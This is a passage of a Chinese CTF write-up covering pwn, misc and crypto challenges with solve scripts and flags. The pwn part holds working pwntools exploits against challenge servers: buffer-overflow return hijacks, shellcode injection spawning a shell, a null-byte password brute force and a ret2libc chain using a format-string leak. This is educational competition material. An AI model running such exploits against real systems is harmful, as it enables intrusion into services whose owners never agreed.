class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">34467</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">key=<span class="number">0x40073D</span></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">8</span>)+p64(key)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="简单的签到"><a href="#简单的签到" class="headerlink" title="简单的签到"></a>简单的签到</h3><blockquote><p>作为大学生，一定要有快速口算的能力！</p></blockquote><p>pwntools运用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">20040</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;challenge.\n&#x27;</span>)</span><br><span class="line">r.sendline()</span><br><span class="line">ans=<span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;= &#x27;</span>)[:-<span class="number">2</span>])</span><br><span class="line">r.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h3><blockquote><p>不能更加简单的pwn_shellcode题,什么你不知道shellcode？快去学吧</p></blockquote><p>ret2shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">43003</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;shellcode?\n&#x27;</span>)</span><br><span class="line">pl=asm(shellcraft.sh())</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">gift=<span class="number">0x401256</span></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">8</span>)+p64(gift)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="00000"><a href="#00000" class="headerlink" title="00000"></a>00000</h3><blockquote><p>你说让我输密码？有没有什么简单的办法呢？</p></blockquote><p>利用函数特性逐位爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">burp</span>():</span><br><span class="line">    r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">15085</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Enter the password: &#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    x=r.recvline()</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;wrong&#x27;</span> <span class="keyword">in</span> x:</span><br><span class="line">        r.close()</span><br><span class="line">        burp()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.interactive()</span><br><span class="line"></span><br><span class="line">burp()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="买黑吗喽了吗"><a href="#买黑吗喽了吗" class="headerlink" title="买黑吗喽了吗"></a>买黑吗喽了吗</h3><blockquote><p>黑吗喽真好玩!</p></blockquote><p>balance负溢出，转无符号&gt;0x100，进入修改str的2字节，改为 <code>%p</code>，可以泄露出balance地址。</p><p>求pie基址，再ret2libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">33352</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./买黑马喽了么/syscall&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./买黑马喽了么/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;%p&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">balance_addr=<span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">pie_base=balance_addr-<span class="number">0x4090</span></span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;pie_base:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">pop_rdi=pie_base+<span class="number">0x11f1</span></span><br><span class="line">ret=pie_base+<span class="number">0x101a</span></span><br><span class="line">puts_plt=pie_base+elf.plt.puts</span><br><span class="line">puts_got=pie_base+elf.got.puts</span><br><span class="line">read_back=pie_base+<span class="number">0x14c0</span></span><br><span class="line">pl=flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>),pop_rdi,puts_got,puts_plt,read_back])</span><br><span class="line">r.send(pl)</span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;puts_addr:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.sym.puts</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;libc_base:x&#125;</span>&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.sym.system</span><br><span class="line">binsh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;feedback:\n&#x27;</span>)</span><br><span class="line">pl=flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>),ret,pop_rdi,binsh_addr,system_addr,read_back])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl)%<span class="number">16</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="over-flow"><a href="#over-flow" class="headerlink" title="over_flow??"></a>over_flow??</h3><blockquote><p>stack overflow??</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">16674</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00\x3b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ez-pcap-1"><a href="#ez-pcap-1" class="headerlink" title="ez_pcap_1"></a>ez_pcap_1</h3><blockquote><p>黑客通过外网getshell进入内网，在域渗透横向文件传输时传送了一个危险文件，你能找到这个危险文件吗？</p></blockquote><p>010editor16进制查看下搜索 <code>SYC</code>，flag：<code>SYC&#123;smb_pcapng_1s_g00d!&#125;</code>。</p><p>​</p><h3 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a>cimbar</h3><blockquote><p>What is cimbar</p></blockquote><p>参考：<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv38452107/">https://www.bilibili.com/read/cv38452107/</a></p><p>提取01字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">01010011010110010100001101111011</span><br><span class="line">01000001011011100011000001110100</span><br><span class="line">01101000001100110111001001011111</span><br><span class="line">01000001011011010100000001111010</span><br><span class="line">00110001011011100011100101011111</span><br><span class="line">01010001010100100101111101000011</span><br><span class="line">01101111001101000110010101111101</span><br></pre></td></tr></table></figure><p>二进制转字符得到flag：<code>SYC&#123;An0th3r_Am@z1n9_QR_Co4e&#125;</code>。</p><p>​</p><h3 id="舔狗的觉醒"><a href="#舔狗的觉醒" class="headerlink" title="舔狗的觉醒"></a>舔狗的觉醒</h3><blockquote><p>听说爱自己的人会有好运哦</p></blockquote><p>爆破解压密码：<code>88888888</code>。</p><p>字节移位输出新zip：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">bytes</span>.fromhex(<span class="built_in">open</span>(<span class="string">&#x27;download.txt&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line">g=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> f:</span><br><span class="line">    x=((k&gt;&gt;<span class="number">4</span>)|(k&lt;&lt;<span class="number">4</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    g+=<span class="built_in">bytes</span>([x])</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(g)</span><br></pre></td></tr></table></figure><p>得到一个加密的pdf文件 <code>flag.pdf</code>，使用PasswareKitForensic去掉pdf密码，打开删除图片，得到flag：<code>SYC&#123;YOu_arE_yOuR_Own_hero&#125;</code>。</p><p>​</p><h3 id="乌龟"><a href="#乌龟" class="headerlink" title="乌龟"></a>乌龟</h3><blockquote><p>starven师傅养了一直会唱歌的乌龟，但是他走丢了，你能帮starven师傅找到他吗(音频文件不只一种用法)</p></blockquote><p>wav文件，sstv音转图：</p><p><code>sstv -d sunset.wav -o result.png</code></p><p>得到的图片里面有 <code>PASS:Be4uti7ulSun5e7</code>。</p><p>wav文件再用deepsound，密码 <code>Be4uti7ulSun5e7</code>，提取出 <code>secret.txt</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">to draw_s  pu setxy -400 200 pd repeat 18 [fd 5 lt 10 wait 2]  repeat 8 [fd 5 lt 10 wait 2]  repeat 21 [fd 5 rt 10 wait 2]  pu setxy -350 200 pd fd 50 wait 5  pu setxy -350 200 pd rt 100 fd 50 wait 5  pu setxy -350 200 pd rt 130 fd 75 wait 5  pu setxy -220 200 pd rt 130 repeat 27 [fd 8 lt 10 wait 2]  pu setxy -430 70 pd lt 130 fd 100 wait 5  pu setxy -480 70 pd lt 90 fd 100 wait 5  pu setxy -420 70 pd fd 100 lt 90 fd 50 lt 90 fd 100 wait 5  pu setxy -350 70 pd rt 90 fd 70 rt 90 fd 50 rt 90 fd 70 wait 5  pu setxy -280 20 pd lt 90 fd 50 rt 90 fd 70 wait 5  pu setxy -250 70 pd rt 180 fd 100 wait 5  pu setxy -200 70 pd rt 90 fd 100 wait 5  pu setxy -130 70 pd lt 130 fd 30 rt 130 fd 110 rt 90 fd 30 wait 5  pu setxy -130 -20 pd lt 180 fd 40 wait 5  pu setxy -70 70 pd fd 70 wait 5  pu setxy -70 70 pd rt 90 fd 50 lt 90 fd 70 wait 5  pu setxy -70 20 pd rt 90 fd 50 lt 90 fd 70 wait 5  pu setxy 20 -30 pd fd 70 wait 5  pu setxy 120 70 pd repeat 18 [fd 5 rt 10 wait 2]  pu setxy 120 70 pd lt 90 fd 100 wait 5  pu setxy 180 70 pd fd 50 lt 90 fd 50 wait 5  pu setxy 230 70 pd rt 90 fd 100 wait 5  pu setxy 260 70 pd lt 90 fd 50 wait 5  pu setxy 285 70 pd rt 90 fd 100 wait 5  pu setxy 260 -30 pd lt 90 fd 50 wait 5  pu setxy 340 70 pd rt 90 fd 100 wait 5  pu setxy 340 70 pd lt 30 fd 115 wait 5  pu setxy 398 -30 pd lt 150 fd 100 wait 5  pu setxy 420 70 pd rt 90 fd 100 wait 5  pu setxy 470 70 pd rt 90 fd 100 wait 5  pu setxy -520 -70 pd lt 90 fd 60 wait 5  pu setxy -490 -70 pd rt 90 fd 100 wait 5  pu setxy -520 -170 pd lt 90 fd 60 wait 5  pu setxy -420 -70 pd rt 90 fd 100 wait 5  pu setxy -420 -70 pd lt 30 fd 115 wait 5  pu setxy -362 -170 pd lt 150 fd 100 wait 5  pu setxy -270 -70 pd lt 90 repeat 27 [fd 8 lt 10 wait 2] lt 180 fd 40 wait 5  pu setxy -230 -120 pd rt 90 fd 30 wait 5 end clearscreen draw_s</span><br></pre></td></tr></table></figure><p>查知为logo编程语言，找个<a target="_blank" rel="noopener" href="https://www.calormen.com/jslogo/">在线网站</a>绘制，得到flag：<code>SYC&#123;TU3T1E_P4INTING&#125;</code>。</p><p>​</p><h3 id="ez-climbstairs"><a href="#ez-climbstairs" class="headerlink" title="ez_climbstairs"></a>ez_climbstairs</h3><blockquote><p>动态规划算法入门题目你知道如何爬楼梯吗？爬对100次就给你flag</p></blockquote><p>爬楼梯经典问题，dp解决，对照测试样例数据，发现是最多可爬3阶。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">climb_stairs_limited_steps</span>(<span class="params">n, k</span>):</span><br><span class="line">    <span class="comment"># 初始化dp数组，dp[i]表示到达第i阶的方法总数</span></span><br><span class="line">    dp = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>  <span class="comment"># 到达第0阶有1种方法（不动）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充dp数组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 计算dp[i]为前面最多k阶的方法数之和</span></span><br><span class="line">        dp[i] = <span class="built_in">sum</span>(dp[<span class="built_in">max</span>(<span class="number">0</span>, i - k):i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[n]</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">15734</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;爬上 &#x27;</span>.encode())</span><br><span class="line">    n = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="comment"># 计算爬n阶且每次最多能爬k阶的方法总数</span></span><br><span class="line">    k = <span class="number">3</span>  <span class="comment"># 每次最多爬3阶</span></span><br><span class="line">    res = climb_stairs_limited_steps(n, k)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;：&#x27;</span>.encode(),<span class="built_in">str</span>(res).encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="doSomeMath"><a href="#doSomeMath" class="headerlink" title="doSomeMath"></a>doSomeMath</h3><blockquote><p>lhRaMk7在没通过他的小升初数学考试之后来GSBP老师这里补习，发现他一道题都做不出来，大学生们能帮帮他吗</p></blockquote><p>用 <code>__le__</code> 或 <code>__lt__</code> 生成 True 或 False，等同于1和0。</p><p>构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">n0 = <span class="string">&#x27;().__lt__(())&#x27;</span></span><br><span class="line">n1 = <span class="string">&#x27;().__le__(())&#x27;</span></span><br><span class="line">n2 = <span class="string">&#x27;().__le__(())+().__le__(())&#x27;</span></span><br><span class="line">n3 = <span class="string">&#x27;().__le__(())+().__le__(())+().__le__(())&#x27;</span></span><br><span class="line">n4 = <span class="string">&#x27;(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))&#x27;</span></span><br><span class="line">n5 = <span class="string">&#x27;(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(())&#x27;</span></span><br><span class="line">n6 = <span class="string">&#x27;(().__le__(())+().__le__(())+().__le__(()))*2&#x27;</span></span><br><span class="line">n7 = <span class="string">&#x27;().__le__(())+().__le__(())+().__le__(())+(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))&#x27;</span></span><br><span class="line">n8 = <span class="string">&#x27;(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))&#x27;</span></span><br><span class="line">n9 = <span class="string">&#x27;(().__le__(())+().__le__(())+().__le__(()))*(().__le__(())+().__le__(())+().__le__(()))&#x27;</span></span><br><span class="line">n10 = <span class="string">&#x27;((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(()))&#x27;</span></span><br><span class="line">n100 = <span class="string">f&#x27;(<span class="subst">&#123;n10&#125;</span>)*(<span class="subst">&#123;n10&#125;</span>)&#x27;</span></span><br><span class="line">n1000 = <span class="string">f&#x27;(<span class="subst">&#123;n10&#125;</span>)*(<span class="subst">&#123;n10&#125;</span>)*(<span class="subst">&#123;n10&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line">num = <span class="string">f&#x27;(<span class="subst">&#123;n9&#125;</span>)*(<span class="subst">&#123;n1000&#125;</span>)+(<span class="subst">&#123;n8&#125;</span>)*(<span class="subst">&#123;n100&#125;</span>)+(<span class="subst">&#123;n7&#125;</span>)*(<span class="subst">&#123;n10&#125;</span>)+(<span class="subst">&#123;n2&#125;</span>)&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ((().__le__(())+().__le__(())+().__le__(()))*(().__le__(())+().__le__(())+().__le__(())))*((((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(())))*(((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(())))*(((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(()))))+((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))*(().__le__(())+().__le__(())))*((((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(())))*(((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(()))))+(().__le__(())+().__le__(())+().__le__(())+(().__le__(())+().__le__(()))*(().__le__(())+().__le__(())))*(((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(())))+(().__le__(())+().__le__(()))</span></span><br><span class="line"><span class="comment"># 9872</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><blockquote><p>nc连接，包连接上即得flag</p></blockquote><p>PoW+逐位问询。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">34835</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;XXXX+&#x27;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode()</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;== &#x27;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode()</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;[-] &#x27;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[+] &#x27;</span>)</span><br><span class="line">    flag += r.recvline().strip()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;MAYB3_Y0U_KN0W_A1AN-B3&lt;K3R?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="ncoCRT"><a href="#ncoCRT" class="headerlink" title="ncoCRT"></a>ncoCRT</h3><blockquote><p>if gcd != 1:</p></blockquote><p>基础CRT。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">p = [<span class="number">1921232050179818686537976490035</span>, <span class="number">2050175089402111328155892746480</span>, <span class="number">1960810970476421389691930930824</span>, <span class="number">1797713136323968089432024221276</span>, <span class="number">2326915607951286191807212748022</span>]</span><br><span class="line">c = [<span class="number">1259284928311091851012441581576</span>, <span class="number">1501691203352712190922548476321</span>, <span class="number">1660842626322200346728249202857</span>, <span class="number">657314037433265072289232145909</span>, <span class="number">2056630082529583499248887436721</span>]</span><br><span class="line">m = crt(c,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(m)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;wha+s_wr0n9!_CRT_bu+_n0+_&lt;0mpr1me!&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="inPEM"><a href="#inPEM" class="headerlink" title="inPEM"></a>inPEM</h3><blockquote><p>丸辣丸辣！开拓者抱头痛哭，我的原神被绳网上的神秘黑客挟持了！好心的绳匠们，你能帮可怜弱小仅仅一岁出头的小星核精讨回公道吗？</p></blockquote><p>已知公钥解析得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">19909823107653171578063591352961144331355821517081529017694276790993397379180193511755806958091550033235815834847549265751244192211761569881061742997804509098095297146520946343734939782935970054031389390447526577982809412074573616889663964050032806967234869741452169276495048891650957729859124875343810181695665153129824527065062831773013713479602052423965588148263292672514853749647510938621421264137177666497737099263481269491867593812579958283619882699866915561357437484323854411934718569074869408000191465973545262527827064708529700071967884924505367105288433603597633451764659888020272057850625902629529400734213</span></span><br><span class="line">e = <span class="number">65537</span></span><br></pre></td></tr></table></figure><p>已知部分私钥：</p><figure class="highlight 